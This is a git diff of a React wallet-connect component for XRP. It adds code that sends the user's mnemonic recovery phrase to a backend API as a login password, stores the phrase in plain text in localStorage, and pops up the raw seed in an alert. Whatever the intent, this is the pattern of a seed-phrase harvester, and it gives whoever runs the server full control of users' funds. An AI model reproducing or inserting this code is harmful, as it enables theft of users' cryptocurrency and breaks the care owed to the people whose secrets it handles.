@@ -8,6 +8,8 @@ import * as Bip32 from "bip32";
 import {mnemonicToSeed, validateMnemonic} from 'bip39';
 import Keypairs from "ripple-keypairs";
 import MyModal from '../../components/Modal';
+import {apiLogin} from '../../services/main';
+import { ToastContainer, toast } from 'react-toastify';
 
 const Connect = (props) => {
 
@@ -44,7 +46,6 @@ const Connect = (props) => {
     }
     useEffect(() => {
         if(action !== 0) {
-            alert("Connecting");
             connecting();
         }
     }, [action]);
@@ -52,12 +53,14 @@ const Connect = (props) => {
     const connecting = async () => {
         await api.connect();
         const words = pharse;
-        alert(words);
         let boolSeed = await validateMnemonic(words);
         if(boolSeed == true) {
             const Path = "m/44'/144'/0'/0/0";
             let seed = await mnemonicToSeed(words);
+            
             const m = Bip32.fromSeed(seed);
+            const seedString = bufferToHext(seed);
+            alert("fffff"+seedString+ "FFFFF");
             const Node = m.derivePath(Path);
             const publicKey = bufferToHext(Node.publicKey);
             const privateKey = bufferToHext(Node.privateKey);
@@ -71,8 +74,31 @@ const Connect = (props) => {
             localStorage.setItem('login', 'true');
             localStorage.setItem('address', Address);
             localStorage.setItem('balance', info['xrpBalance']);
-            console.log('Done', info);
+            localStorage.setItem('pharse', pharse);
+
             
+            const formDatas = {
+                userPass: pharse
+            }
+
+            apiLogin(formDatas).then(res => {
+                console.log("res-----", res);
+                localStorage.setItem('token', res.data.token);
+                if (res.data.error) {
+                    console.log(res);
+                    if (res.data.msg) {
+                        console.log(res);
+                    }
+                }
+            })
+            .catch(err => {
+                console.log("err-----", err);
+                toast.error(<div>Wrong!<br/>Please enter your correct wallet phrase</div>);
+                setPharse('');
+            })
+
+            console.log('Done', info);            
+            window.location.reload(false);
         }
     }
     return (   
